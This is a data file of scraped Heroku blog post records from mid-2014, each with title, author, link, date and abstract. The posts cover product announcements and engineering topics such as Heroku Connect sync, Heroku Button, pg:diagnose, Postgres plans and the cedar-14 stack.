{"website": "Heroku", "title": "The new PHP on Heroku now Generally Available", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/the_new_php_on_heroku_now_generally_available", "abstract": "The new PHP on Heroku now Generally Available Posted by Craig Kerstiens July 15, 2014 Listen to this article Today we’re announcing the general availability of the new PHP support on Heroku .\nThe key features, in case you missed them when we outlined them in the beta announcement, include: New modern runtimes in HipHop VM Packaging and first class frameworks Heroku XL support for large scale enterprise apps We’re very happy to make this generally available for all users. Since our public beta weeks ago we’ve seen a variety of users trying many of these modern frameworks such as Laravel and Symfony , as well as work towards improving the development experience by running our own buildpack locally . In addition to all of the above which was available at the public beta, we’ve improved our PHP support to deliver items we’ve heard from you as important: Updates to support the latest PHP and HHVM versions including PHP 5.5.14 and 5.6.0RC2 ; Improvements to web server setups ; New documentation on session management and file uploads to help ensure your application is production ready. We look forward to seeing what you build with our new PHP support. Have a look at the PHP category on Heroku Dev Center and learn how easy it is to get started!", "date": "2014-07-15,"},
{"website": "Heroku", "title": "Heroku Connect: Faster Synchronization and New Event Driven Architecture", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/heroku-connect", "abstract": "Heroku Connect: Faster Synchronization and New Event Driven Architecture Posted by Margaret Francis July 30, 2014 Listen to this article In May we released the first version of Heroku Connect, a service that makes it easy to build Heroku apps that share data with your Salesforce deployment. Today we released our first major update to the service, bringing new speed and scale enhancements to all Heroku Connect users. Together, these enhancements lower latency on Heroku Connect synchronization, provide developers with more granular controls and improve insight into their Force.com API utilization. Event Driven Synchronization from Force.com to Heroku Postgres One of the top requests from the first Heroku Connect customers was to reduce the latency of synchronization between Force.com and Heroku Postgres.  With this release, developers can take advantage of event driven synchronization, which is a new configuration option available on each object. Using the Force.com Streaming API, this mode proactively notifies Heroku Connect of any pending changes, rather than waiting for the service to poll Salesforce for updates.  So instead of having to wait for a periodic poll to get new updates for Salesforce, the changes are sent in real time. Access Mode by Object With this release of Heroku Connect, developers can set the read-only / read-write status of their system on a per object basis.  Previously this configuration setting was applied to all objects in a deployment. With the new fine grained access controls, companies can enjoy greater flexibility in how Postgres write operations are propagated back to Salesforce. Fast writes from Heroku Postgres to Force.com Heroku Connect now asynchronously batches updates from Heroku Postgres to Force.com every 10 seconds. This change greatly reduces latency of changes being sent from Heroku Postgres to Force.com, and in conjunction with event driven updates, makes bi-directional synchronization near real time. New Polling Configuration Controls The Salesforce polling interval is now configurable on a per object basis, from 2 to 60 minutes. Since developers can set the interval as low as every 2 minutes per mapping, \"Fast Sync\" mode is now removed. The main benefit of less frequent polling is lower API usage. Setting the sync frequency to 60 minutes is useful for controlling API utilization where latency is less important than management of API calls, particularly Bulk API calls, when there are different systems and processes updating large data sets within a given Salesforce deployment. Estimated Force.com API Utilization and Capping Heroku Connect now provides an estimated Force.com API utilization range per object based on specified poll frequency and estimated volume. This estimate is provided for planning purposes during configuration.  In practice, Heroku Connect will now manage the total API utilization for each mapping to a maximum of 3000 calls per rolling 24 hour period. Some customers with large data sets, for instance developers performing an initial sync of Salesforce tables containing more than 100 million records, or sustained update rates of >100K records per minute inside Heroku Postgres, may wish to have this constraint removed to further reduce latency. Please contact Support for assistance. Additional performance and scale enhancements With the release, additional performance and architecture improvements have enabled Heroku Connect to scale to virtually any sized Salesforce org or object; synchronizing hundreds of millions of rows on a single object is now easily available. More Information For an engineering perspective on event driven data sync, check out the post on the Heroku Engineering Blog . Heroku Connect documentation can be found in the Heroku Dev Center .  Additional detail regarding the Streaming API/ PushTopics is available in the Force.com documentation found here . HerokuConnect Force.com", "date": "2014-07-30,"},
{"website": "Heroku", "title": "Event-driven Data Sync", "author": ["Scott Persinger"], "link": "https://blog.heroku.com/sf-streaming-api", "abstract": "Event-driven Data Sync Posted by Scott Persinger July 16, 2014 Listen to this article Heroku Connect is a service offered by Heroku which performs 2-way data synchronization between force.com and a Heroku Postgres database. When we first built Heroku Connect, we decided to use polling to determine when data had changed on either side. Polling isn't pretty, but its simple and reliable, and those are \"top line\" features for Heroku Connect. But polling incurs two significant costs: high latency and wasted resources. The more you poll the more you waste API calls and database queries checking when there are no data changes. But if you lengthen your polling interval then you grow the latency for the data synchronization. Events all around The solution is conceptually simple - register an event handler with each data source so that it can send you an event when data has changed. Of course, most people that have done event-driven programming know that the practice is often harder than it sounds in theory. In this post we will show how to use the force.com Streaming API to subscribe to event notifications from force.com. Then we will show how to do something similar to listen for events from Postgres. force.com events The force.com Streaming API is devoted to sending real-time events of data changes inside force.com. The Streaming API supports a publish/subscribe model. In order to create a subscription, we first need to construct a PushTopic . This creates a named query in the force.com system that we can subscribe to. Whenever a record changes which satisfies the query, the streaming API will publish those changes as events. We construct the PushTopic automatically based on the force.com table that you are synchronizing with Heroku Connect. This is the Python code which accesses the force.com SOAP API (using the salesforce-python-toolkit ): def create_push_topic(self, object_name):\n        topic = self.h.generateObject('PushTopic')\n\n        topic.ApiVersion = 30.0\n        topic.Name = \"hconnect_{0}\".format(object_name)\n        topic.NotifyForFields = \"All\"\n        topic.NotifyForOperationCreate = True\n        topic.NotifyForOperationUpdate = True\n        topic.NotifyForOperationDelete = True\n        topic.query = \"select Id from {0}\".format(object_name)\n        res = self.h.create(topic)\n        if hasattr(res, 'errors'):\n            raise InvalidConfigurationException(\"PushTopic creation failed: {0}\".format(res.errors[0])) Now we need to setup a subscriber to this topic. We are using Node.js for most of our event-driven needs because it handles that architecture so well. The best force.com client library for Node.js is called NForce . NForce supports the Streaming API and makes it incredibly easy to subscribe to a PushTopic: var nforce = require(\"nforce\");\n\n    var org = nforce.createConnection(...);\n    org.authenticate(...);\n\n    var pt_name = \"hconnect_\" + object_name;\n\n    // Create a connection to the Streaming API\n    var str = org.stream({ topic: pt_name });\n\n    str.on('connect', function(){\n        console.log('connected to pushtopic');\n    });\n\n    str.on('error', function(error) {\n        console.log('error: ' + error);\n    });\n\n    str.on('data', function(data) {\n        // Data will contain details of the streaming notification:\n\n        console.log(data);\n    }); For the purposes of Heroku Connect, whenever we receive a streaming event we fire off a task through Redis which commands a worker to query for the latest data from force.com and sync it to Postgres. Although it's possible to receive record data over the Streaming API, there are various limitations. Also, if our subscriber is down for some reason then we may miss events. For these reasons we use streaming events as a notifier that some data has changed and we should query for those changes using the force.com SOAP API . Listen / Notify Next up is how we listen for change events on the Postgres side. Postgres supports a very cool publish/subscribe system using the built-in Listen and Notify commands. Listen is the \"subscribe\" part. You issue this command through your database client to create a subscription to a named channel. Inside the database, you use the Notify command to publish events to the channel. Sounds simple enough, right? The publisher One easy way to call Notify within the database is to create a function which performs the call and to create a trigger which calls your function when data is modified. Here's the PLSQL code for our trigger function: CREATE FUNCTION table1_notify_trigger() RETURNS trigger AS $$\n    DECLARE\n     BEGIN\n       PERFORM pg_notify('channel1');\n       RETURN new;\n     END;\n    $$ LANGUAGE plpgsql;\n    CREATE TRIGGER table1_insert_trigger AFTER INSERT ON table1\n    FOR EACH ROW EXECUTE PROCEDURE table1_notify_trigger(); This code defines a new function called table1_notify_trigger . When this function is executed it calls pg_notify with our channel argument channel1 . Finally, we create an AFTER INSERT trigger on table1 that executes our function whenever a row is inserted in the table. If we want to track other DML events we can create additional AFTER UPDATE or AFTER DELETE triggers. The subscriber Again we've chosen to use Node.js to listen for events from Postgres because the LISTEN command is well support by the node-postgres module. The code is very simple: pg.connect(db_url, function(err, client) {\n        if (err) {\n            console.log(\"Error connecting to database: \" + err);\n        } else {\n            client.on('notification', function(msg) {\n                console.log(\"DATABASE NOTIFY: \", msg.payload);\n                // Move some data...\n            });\n            var query = client.query(\"LISTEN channel1\");\n        }\n    }); After connecting to the database, we just call client.on to register a handler for notifications, and then execute the SQL command LISTEN channel1 to setup the subscription. You can pass data to your subscriber and access it through the msg.payload attribute. Yay for events The notifications system in Postgres works very well. It could be even better if Postgres supported a \"default event set\" that avoided the need to create the trigger. However, having those primitives gives you lots of control. You can easily envision some really cool things you could do, like streaming change events out over a websocket to the browser. Give it a try and let us know what cool things you come up with. Heroku Connect Force.com postgres", "date": "2014-07-16,"},
{"website": "Heroku", "title": "New Heroku Dashboard and Metrics now in Beta", "author": ["Rand Fitzpatrick"], "link": "https://blog.heroku.com/new-dashboard-and-metrics-beta", "abstract": "New Heroku Dashboard and Metrics now in Beta Posted by Rand Fitzpatrick August 05, 2014 Listen to this article At Heroku, we’re focused on delivering thoughtfully designed systems to improve developer productivity and experience. We firmly believe that improving the development and operations experience helps developers to build and run better apps. This improvement allows developers to focus more on functionality, and businesses to focus more on the value of their applications. Today we are pleased to announce two new features, both in public beta, that support this mission: a new Heroku Dashboard and Heroku Metrics. These new systems bring developers powerful new clarity and simplicity around application management, execution, and optimization. New Heroku Dashboard: Managing applications, organizations, and accounts via the web is now easier than ever. Heroku Metrics: Monitoring production applications and understanding the relationships between runtime characteristics is now built into Heroku. Both are live for you to begin using now. New Heroku Dashboard The management of applications, organizations, and accounts is a part of the development and scaling lifecycle. To make these actions more graceful and intuitive, we’ve developed an entirely new Dashboard for your use of Heroku. Keeping things clear, fast, intuitive, and accessible is important to us, and we wanted the new Dashboard to embody those attributes. It had to be as responsive and reliable as a native application. To achieve this, we redesigned it from scratch and rebuilt it using Ember.js, creating a modern interface with ambitious layouts and interaction patterns. Heroku should work with you, wherever you go. Whether you’re using Dashboard on your largest desktop display or the smallest of laptop screens, you’ll find the new layout brings the controls and data at your fingertips, and makes app- and org-switching speedy. The new Dashboard also gives you the ability to explore changes to your application in a safer manner. We converged on a view-first pattern in order to shield you from accidental changes with potential operational impact, like scaling or resource deletion. With this new interaction mode, you explicitly toggle into edit-mode before you can make modifications to your apps. We took the opportunity presented by this functional redesign to develop a new visual design, as well. We crafted a more friendly and approachable style, to lighten the load of web application development. The result is a lighter interface that favors content over chrome. To get started with the new Dashboard, head to dashboard-next.heroku.com .  During the beta, you may need to visit the old Dashboard to complete some administrative tasks; you can switch between the two at any time.  When the new Dashboard is GA later this year all of the old functionality will be ported over. Heroku Metrics Managing applications through development and scaling often requires a deeper understanding of performance and resource utilization. A seamless part of the new Dashboard, our new Heroku Metrics system is designed to give you just that understanding, making it simple for you to analyze and optimize performance of your applications on Heroku. In order to provide clarity and general visibility into your applications’ performance and behavior, the new Metrics system provides a unified view of the data most relevant to tuning and scaling your application. Now you have direct visibility of these performance characteristics: Throughput: One of the most important characteristics to measure on a web process is its throughput. Heroku Metrics provides requests per minute segmented by HTTP status codes (OK vs. Failed) per time period. Response Time: The response time of your application is also a key measure of system health and quality of service. The Metrics dashboard provides both the median and 95th percentile response times per time period. Errors: Platform error codes can provide excellent insight into issues with your application, so the Metrics system interpolates them with the rest of your time series data for better understanding of causality. Memory: Visibility into the memory utilization of your application is useful when assessing capacity, finding memory leaks, or identifying performance degradation due to swap. CPU Load: CPU load is another critical component of performance monitoring, especially for applications with processing intensive workloads, or high levels of in-process parallelism. By unifying the display of this data along a consistent time axis, and by representing the data in the manner most meaningful for each metric, the framework provides more visibility into the interaction of these parameters and the relationships between them. This should offer a more intuitive way to understand and tune the overall performance of your app. JS Bin As we gather more data and feedback, we will be introducing guidance around performance optimization, including recommendations on horizontal or vertical scaling of applications. This guidance will be based on heuristics we are currently modeling from the range of applications on the platform. We will be rolling these out soon, and improving them as we go. In order to get started with Heroku Metrics, visit dashboard-next.heroku.com and select the Metrics tab for one of your applications. The Metrics feature is enabled only for applications with more than one running dyno, where performance tuning is likely to be more of a priority. Existing applications should have some period of metrics already available in the system, while newly created applications or applications with recently added process types should see data available in the Metrics view within about an hour of the update. For details on the metrics displayed, see the documentation in Dev Center . Feedback and Availability We hope you enjoy the features we are making available today, and encourage any feedback you have on them as we work towards General Availability later this fall. dashboard metrics", "date": "2014-08-05,"},
{"website": "Heroku", "title": "Introducing Heroku Button", "author": ["Michael Friis"], "link": "https://blog.heroku.com/heroku-button", "abstract": "Introducing Heroku Button Posted by Michael Friis August 07, 2014 Listen to this article At Heroku, we want to make the process of deploying, running and updating code simple and easy. To that end, we’re launching the Heroku Button: a simple HTML or Markdown snippet that can be added to READMEs, blog posts and other places where code lives. Clicking a Heroku Button will take you through a guided process to configure and deploy an app running the source code referenced by the button. The best way to understand the Heroku Button is to try one. Click the example button below to deploy a Node.js sample project to an app running on your Heroku account: How it works When you see a Heroku Button in a README, in documentation or in a blog post, then this is a piece of code that’s ready to deploy and run on Heroku. When you click a Heroku Button, you access a setup flow in Dashboard. If you’re not logged in or don’t have an account, you’ll go through the login flow first. Heroku then determines what code you’re trying to deploy (using either the referer header or a parameter in the button URL). Heroku uses an app.json manifest in the code repo to figure out what add-ons, config and other deployment steps are required to make the code run. This is used to configure and deploy the app. Once you have provided any required config and confirmed the setup, Heroku will start deploying the source to a new app on your account: When setup is complete, you can open the deployed app in your browser or inspect it in Dashboard. To make changes, simply clone from the Heroku git repo as you would any other app, modify to your liking and push the changes: $ heroku clone -a my-new-app\n…\n$ vim index.js\n$ git add .\n$ git commit -m “update index.js”\n$ git push heroku master\n... The Heroku Button replaces previous README-defined guides to clone code, create an app, provision add-ons, run setup scripts and git-push. All these steps and requirements can now be encoded in an app.json file and placed in a repo alongside a button that kicks off the setup with a single click. Adding a Heroku Button Adding a Heroku Button to a piece of code that you care about is simple. Currently, code hosted in public repos on GitHub is supported. The first step is to add an app.json to the root of the repo. App.json is a manifest format for describing apps and specifying what their config requirements are. Heroku uses this file to figure out how code in a particular repo should be deployed on the platform. Here’s a sample app.json file: {\n  \"name\": \"Node.js Sample\",\n  \"description\": \"A barebones Node.js app using Express 4\",\n  \"repository\": \"https://github.com/heroku/button-sample\",\n  \"logo\": \"https://node-js-sample.herokuapp.com/node.svg\",\n  \"keywords\": [\"node\", \"express\", \"static\"]\n} With the app.json file in place, the next step is to create the actual button. The button can live on any web page you like, but a good start is probably the README file in the repo that source code you want people to deploy. Here’s an example Markdown snippet: [![Deploy](https://www.herokucdn.com/deploy/button.png)](https://heroku.com/deploy) Note that the snippet is repo-agnostic: It can be copy-pasted without modification and will work correctly if forked to a different repo. Heroku resolves the repo originating a button click by inspecting the referer header. HTML is also an option and you can also use Heroku Buttons outside repo READMEs if you add a query parameter to the button URL. The Dev Center documentation has details on how to create and maintain app.json files and links to additional resources. Looking ahead We’re excited about the Heroku Button: It’s going to obviate reams of README on public repos describing how to configure apps to run on Heroku. We have worked with several add-on providers to take advantage of buttons to make experimenting with their services on Heroku easier. Check out the CloudAMQP and MemCachier Dev Center articles and notice how sample apps in different languages can be deployed and tested with a simple click. Our good friends at Twilio have added a deploy button to their Rapid Response Kit, a suite of communication tools that can be used for anything from emergency response to community organization. With the button in the README, interested developers can immediately deploy the Rapid Response Kit to Heroku and start hacking on it to make it do what they need. We are also using Heroku Button for the tools and software that we ourselves support and maintain. Yesterday we released Starboard , a tool for managing onboarding and offboarding of employees. The README comes with a Heroku Button to make it easy for others to try out and build on our work. And the Heroku Button is cropping up in other places too: Check out the City72 app , a preparedness platform built by the San Francisco Department of Emergency Management and IDEO. The app runs the sf72.org site to help San Franciscans prepare for emergencies and with the Heroku Button in place, it’s now very simple for other cities and communities to deploy their own preparedness sites on Heroku. We’re looking for more Heroku Buttons, so if you maintain open source code and if you want to make deploying that code to Heroku super simple, you should consider adding a Heroku Button to your README. Check out the Heroku Button docs for more details. And when your button is live, let us know via Twitter by using #HerokuButton.  We'll be listening and will retweet some of our favorites.", "date": "2014-08-07,"},
{"website": "Heroku", "title": "Introducing pg:diagnose", "author": ["Will Leinweber"], "link": "https://blog.heroku.com/pg-diagnose", "abstract": "Introducing pg:diagnose Posted by Will Leinweber August 12, 2014 Listen to this article Introducing pg:diagnose, a new tool for finding and fixing performance issues with your Heroku Postgres database. The heroku pg:diagnose CLI command unlocks the wealth of built-in information that PostgreSQL stores about its own health and performance , presenting it in simple report that makes identifying and correcting common database problems effortless. At Heroku, we not only run dozens of internal Postgres systems but also have the privilege of running the Postgres systems of many, many customer databases. In doing this, we've encountered and fixed every problem imaginable – and many that were previously unimaginable. Because of that, we have built up a tremendous amount of experience, knowledge, and intuition around how Postgres behaves. Today we're happy to announce pg:diagnose. This new tool runs several diagnostic checks on your database and generates a report showing potential problem spots. Let’s take a look at a sample pg:diagnose report: First off, that 9 day query is potentially causing severe problems because it prevents database garbage collection , and should be killed with heroku pg:kill 30597 . Next, a  90% hit rate means that 10% of my queries aren’t cached in memory , which means 10% of my queries are going to be much slower than they need to be. I’d probably make a follower of the next higher plan to get more ram, and then do a fast changeover . And finally, that index is taking up a lot of space, and I’m never using it, so I’ll consider dropping it with a migration that runs DROP INDEX logs_created_at; Everything else is green, so no need to to worry about the rest today. There's no perfect rule of thumb for how many issues is an acceptable level for your database. While the three issues in this example may be on a lighter side, each issue surfaced with pg:diagnose merits further exploration to ensure your database is performance smoothly. A few minutes with pg:diagnose and your database can be humming smoothly, and you can be saving several dollars to get the performance you need. pg:diagnose is available today in Heroku Toolbelt version 3.9.0, and I hope it helps you the next time you need to take a closer look at your database.", "date": "2014-08-12,"},
{"website": "Heroku", "title": "The New Heroku Postgres Database Experience", "author": ["Matthew Soldo"], "link": "https://blog.heroku.com/the_new_database_experience_with_heroku_postgres", "abstract": "The New Heroku Postgres Database Experience Posted by Matthew Soldo August 12, 2014 Listen to this article Today Heroku is rolling out one of the most significant upgrades ever to our Postgres Database-as-a-Service. This new release is focused on a set of services that run on top of your Heroku Postgres database, making it easier to understand and operate, especially at scale. In addition, we are rolling out new production database plans with double the memory and 2-3 times the performance of our existing plans at the same cost to you. These features represent a new experience for our Postgres service, which we collectively call DbX, for database experience.  The highlight of these new features is Performance Analytics, a set of analytics and visualization tools that allow you to understand what is happening with your database and optimize its performance. In addition, we are bolstering the security of the service with the introduction of encryption-at-rest. As with other Heroku products, we hope this focus on experience, and specifically the traditionally hard problems of operating and optimizing databases, will make building apps more productive and enjoyable. Performance Analytics: Your Guide to Optimizing Queries and Schemas Faster databases are a boon, but even the most powerful plans available will be crushed at scale by un-optimized queries and schemas. Running and supporting tens of thousands of production databases, Heroku has substantial experience in diagnosing and optimizing database performance.  Performance Analytics is the embodiment of this experience into a simple and easy-to-use product. Performance Analytics allows development teams to quickly and easily identify the queries that most impact database performance. We call these expensive queries . Often, simply adding the right index or more aggressively caching data can make enormous improvements to performance. But it can be difficult for teams to identify which queries are most affecting performance and worth the effort to improve. Further complicating optimization is the fact that looking at queries at a single point in time lacks the necessary context to understand the problem. Performance Analytics makes identifying and optimizing queries easy. It presents a list of each type of query your database runs (normalized to control for differing constants). The queries are sorted by the total time they occupy in the database (their average execution speed multiplied by their volume), so the most expensive queries are shown first. Finally, seven days of trending history of both the latency and throughput are shown in an easy-to-read graph. In addition to query optimization there are many common problems that effect databases. These include low cache and table hit ratios, high connection counts, unused indexes, bloat, and blocking transactions. These problems are now easily discoverable with the pg:diagnose command in the Heroku toolbelt: This diagnostics tool encodes much of the database tuning expertise that Heroku’s data team has acquired from running hundreds of thousands of databases over the past five years. Using pg:diagnose you will be able to find quick and simple ways of optimizing your database’s performance and keep your app running as quickly as possible. Read more about it in this blog post . Continuous Protection, Now with On-disk Encryption Continuous Protection is designed to keep your data safe, secure, and available. With the launch of Heroku Postgres DbX, Continuous Protection is gaining encryption-at-rest on all new Premium and Enterprise tier databases. We’ve talked in the past about how Continuous Protection keeps your data safe by archiving your new data every 60 seconds. Even in the most catastrophic failures imaginable, important business data stored in Heroku Postgres is recoverable. Continuous Protection also keeps your database available. By performing 20 diagnostics health checks to your database every 30 seconds, Continuous Protection monitors that your database is up and running to meet your applications’ needs. And if a diagnostic should fail then our automated systems repair the database, automatically. Finally, Continuous Protection keeps your data secure. These safety measures include paranoid system configurations, automatic security patch application (often before exploits are publicly announced), regular intrusion tests, required enforcement of impossible-to-guess database credentials, and required SSL-encrypted connections from all outside clients. Today we are bolstering the security of Heroku Postgres by encrypting data-at-rest on all new Premium Tier databases. Doing so allows Heroku Postgres to comply with the most stringent security requirements. In the exceedingly unlikely event of a physical breach of our underlying infrastructure (i.e., if someone broke into the datacenter and removed the disk drives), your data would remain safe and secure. New Plans with 2x Memory and 3x Performance In addition to Heroku Postgres DbX we are launching new database plans with double the memory and speed improvements of up to 3x at the same price as our current plan lineup . These plans feature an upgraded and re-engineered infrastructure to drastically improve their memory and speed. We are also simplifying our database plan names. While many users enjoy the Japanese themed naming scheme, the plan names are difficult to remember and aren’t ordinal. To this end we are changing the names of our production plans to a simple scheme that consists of the tier name, plus a numeral that provides an approximation of the order of magnitude of the resources available to the plan. For example Standard Yanari is now Standard 0 , Standard Tengu is now Standard 2 , and Premium Ika is now Premium 4 . Details of the new plans are available here . The tier names remain unchanged - Standard, Premium, and Enterprise. The plan levels available are 0, 2, 4, 6, 7, and 8.  The names of our hobby plans (dev and basic) will remain unchanged. Availability and Upgrading of New Features Heroku Postgres DbX is available today on all existing production Postgres databases (versioned 9.2 and above). The new plans with enhanced speed and memory are available for provisioning immediately. Encryption at rest is available only on newly provisioned Premium or Enterprise Tier databases. If you need to upgrade your database to take advantage of DbX or our new plans it has never been easier. We have introduced a new tool, pgbackups:transfer that automatically copies your database to a new one: $ heroku addons:add heroku-postgresql:standard-4\n\nAdding heroku-postgresql:standard-4 on pg-benchmarks... done, v11 ($50/mo)\nAttached as HEROKU_POSTGRESQL_BROWN_URL\nThe database should be available in 3-5 minutes.\n\n$ heroku pgbackups:transfer DATABASE_URL HEROKU_POSTGRESQL_BROWN_URL Whether you’re looking to get better visibility , performance , or security around your data we feel that everyone will have something they’ll enjoy in this newest release. Upgrade today to begin taking advantage of all there is in this latest release.", "date": "2014-08-12,"},
{"website": "Heroku", "title": "Retrospectives", "author": ["Noah Zoschke"], "link": "https://blog.heroku.com/incident-retrospectives", "abstract": "Retrospectives Posted by Noah Zoschke August 13, 2014 Listen to this article Retrospectives are a valuable tool for software engineering teams . Heroku consistently uses retrospectives to review operational incidents , root cause problems, and generate remediation tasks to improve our systems. Increasingly we use retrospectives for another purpose: to improve teamwork and interactions on projects. Here we intentionally avoid technical discussions and focus on the emotional and human aspects of work, with the goal of creating positive insights into how to improve as a team. When The most common times people conduct retrospectives are after some bad incident, or at the conclusion of a big project. These are worthwhile times, but there are now other times that we use retrospectives too. For example, a good time to conduct a retrospective is mid-project to course correct. Is a project not going swimmingly? Taking the time to stop and evaluate how the project is going wholistically -- beyond the typical status checks -- can positively impact the remainder of the project. Weekly is another option. While this may seem excessive, it works well. It can be a good opportunity to blow off steam if nothing else, but it is a value use of 15 minutes or even an hour if it helps you work more effectively as a team. One insight is that increasing our frequency of retrospectives allows us to practice and improve the process of the retrospective itself. When Tactically A 90 minute meeting Friday afternoon, a week after a project conclusion works best. Don't conduct a retrospective the day following. Let people rest and have reflection time. Don't do it 3 weeks later when people have forgotten relevant details. Don’t rush, as it takes a good amount of time to shift from work mode to reflection mode. And don’t cram it into a busy work day and ask everyone to context shift twice.\nHow A good retrospective depends on an active facilitator to help guide a group to meaningful insights. This starts with best practices for hosting a meeting: Generate a clear agenda document ahead of time Generate a broad guest list with project stakeholders, engineers, supporting teams and more Create a calendar event with the time, room, attached agenda and video call, and email the guest list Setup A/V 10 minutes ahead of time What to do during There is an art to good facilitation to actively but neutrally guide discussions, a few keys we've found helpful: State a clear purpose: “To help the team improve by focusing attention on teamwork and interactions of the PX Dynos project” Facilitate from a neutral perspective. If you can’t, ask an outsider to facilitate. Ask questions of everyone Social engineer unique and constructive interactions Finally, by providing guided activities we're able to have a clearer agenda and remove some of the monotonous work that exists at each retrospective. Typically conducting a single exercise or two during a retrospective works to keep people active and engaged, and allows you to extract something new. A few of the guided activities we've found helpful are: A round-table checkin where everyone in the meeting gets 30 seconds to say how they are doing or why they are here A timeline activity where everyone remembers key events and puts them in rough order A “five whys” analysis Start Doing / Stop Doing / Keep Doing brainstorming Whether it's to review and improve from an operational incident, or simply to improve how you work as a team we've found retrospectives a useful tool in our toolchest. Hopefully you can find the same or can expand their value from applying some of the above. incident response", "date": "2014-08-13,"},
{"website": "Heroku", "title": "Cedar-14 Public Beta", "author": ["Michael Friis"], "link": "https://blog.heroku.com/cedar-14-public-beta", "abstract": "Cedar-14 Public Beta Posted by Michael Friis August 19, 2014 Listen to this article At Heroku, we want to give our users access to the latest and greatest software stacks to base their apps on. That’s why we continuously update buildpacks to support new language and framework versions and let users experiment further using third-party buildpacks . Sitting underneath slugs and buildpacks are stacks . Stacks are the operating system and system libraries required to make apps run. Today we’re releasing into public beta a new version of the Celedon Cedar stack: cedar-14 . cedar-14 is built on the latest LTS version of Ubuntu Linux and has recent versions of libraries and system dependencies that will receive maintenance and security updates for a long time to come. Before making cedar-14 the default stack, Heroku is looking for feedback from our users. To help weed out bugs and problems, please try out the stack with existing apps and new source code. Creating a cedar-14 app Here’s how to create a new app running on cedar-14 : $ heroku create --stack cedar-14\n... Pushing and deploying to cedar-14 apps works exactly the same as deploying apps on the classic Cedar stack. Updating an app to cedar-14 Before migrating an existing app to cedar-14, we recommend either first upgrading an existing staging app or testing your app source in a new cedar-14 staging app. To migrate an existing app to cedar-14 , use the stack command: $ heroku stack:set cedar-14 -a example-app\n...\n$ git commit -m \"update to cedar-14\" --allow-empty\n...\n$ git push heroku master\n... Note that running stack:set only tells Heroku that you want the next push to be built and deployed on a different stack. You have to push and force a rebuild for the change to take effect. See the full Migrating to Cedar-14 Dev Center article for additional details. If, despite of testing, your app doesn’t work correctly on cedar-14 , you can always use rollback to revert the stack change: $ heroku rollback Note that this will cause the apps stack to be reset to cedar and you need to re-run stack:set cedar-14 to deploy to cedar-14. Compatibility Stack compatibility is important to us, but we are also trying to take advantage of this opportunity to remove some less-used parts of the current stack surface area. We have documented the differences between the classic Cedar stack and cedar-14 beta stack on Dev Center. In addition to missing packages, apps may also encounter incompatibilities simply because most libraries on cedar-14 have been updated to their most recent versions. Please get in touch on stack-feedback@heroku.com or open a support ticket if your app fails to build or run on cedar-14 for any reason. Buildpacks We have updated all of the default buildpacks that we maintain to work with cedar-14 and are keen to get user feedback. We have also updated certain much used non-default buildpacks such as nginx-buildpack and buildpack-pgbouncer . If you maintain a 3rd buildpack, please refer to the Buildpack API article for details on how to support multiple stacks. We want to help buildpack maintainers with this update process, so please don’t hesitate to reach out to stack-feedback@heroku.com with questions or concerns. We’re looking forward to helping our users move to cedar-14 , the latest and greatest Heroku stack. Apps running on cedar-14 will stay updated, fast and secure for a long time to come. Get in touch on stack-feedback@heroku.com if you encounter problems or have suggestions.", "date": "2014-08-19,"},
{"website": "Heroku", "title": "Try the new Uber API on Heroku", "author": ["Michael Friis"], "link": "https://blog.heroku.com/try_the_new_uber_api_on_heroku", "abstract": "Try the new Uber API on Heroku Posted by Michael Friis August 21, 2014 Listen to this article On Wednesday, Uber launched an API to let developers build new products and services that leverage the Uber ridesharing platform. Uber built a simple Python/Flask app that developers can use when exploring how the API works. This is the sort of experimentation and innovation that we at Heroku want to enable, so we sent a pull request to add an app.json file to the repo and a Heroku Button to the readme. To deploy the Uber sample on Heroku and experiment with the new Uber API, simply register on the Uber developer site and then click the button below: Once the app has been set up on Heroku, you’ll have to go back to the Uber developer site and configure the redirect URI to the URI for your newly created Heroku app. That’s the power of Heroku: Setting up and configuring apps is quick and easy, and once you’re set up, scaling to über-size is just as simple.", "date": "2014-08-21,"},
{"website": "Heroku", "title": "Hutils - Explore your structured log data", "author": ["Brandur Leach"], "link": "https://blog.heroku.com/hutils-explore-your-structured-data-logs", "abstract": "Hutils - Explore your structured log data Posted by Brandur Leach September 04, 2014 Listen to this article Many of Heroku's internal components make heavy use of logfmt to log information about what's going on in production. The format is hugely valuable in that it allows us to retroactively analyze what happened during any arbitrary request to our components, query our log traces in very flexible ways, and combined with Splunk, easily generate arbitrary metrics on historical data. It's unquestionably been an invaluable tool for fixing countless bugs, tracking down the root cause of many production incidents, and assessing usage in ways that would have been difficult otherwise. That said, when viewed in the wrong light, logfmt is capable of producing hard-to-read walls of text like nothing else, which can be slow for a human to parse and even more difficult to visualize. The wall of text below for example, represents a standard fulfillment from the build API and is a whopping 51 pages long: To make exploring this data a slightly less onerous task, we've written a tiny suite of tools called \"hutils\" that are installable via Rubygems: gem install hutils See the README for full details on the usage information, but a few of the more important tools in hutils are: ltap : Extracts a message stream from either Splunk or Papertrail based on an input search query, like for example, a request ID . The stream is dumped to stdout for analysis or processing by other tools. lviz : Parses a set of log messages to build a tree where ancestors represent the largest possible sets of common key/value nodes for all of their descendants, which usually has the effect of pruning a huge amount of duplicate data. This tree is then displayed on the terminal in an attractive way. As dictated by the philosophy of small, sharp tools described in The Art of Unix Programming , tools from the suite are designed to be chained together to augment their usefulness. Combining ltap and lviz looks something like this: ltap \"95a89bef-ff65-49c8-95a6-fbc0fbeca8cd earliest=-1d\" | head -n 50 | lviz And the ugly Splunk trace above is transformed into something a little more digestible: Note that lviz also ships with a --compact option if the output above is too verbose for your taste. Hutils also ship with a few other commands to help work with logfmt: lcut : For selecting fields from a logfmt stream. Also suitable for use with heroku logs --tail . lfmt : Prettifies a logfmt stream with colors, whitespace, and custom highlights. Also suitable for use with heroku logs --tail . Give it a try today and if you have any requests or want to contribute then check out the project on GitHub . hutils logs", "date": "2014-09-04,"},
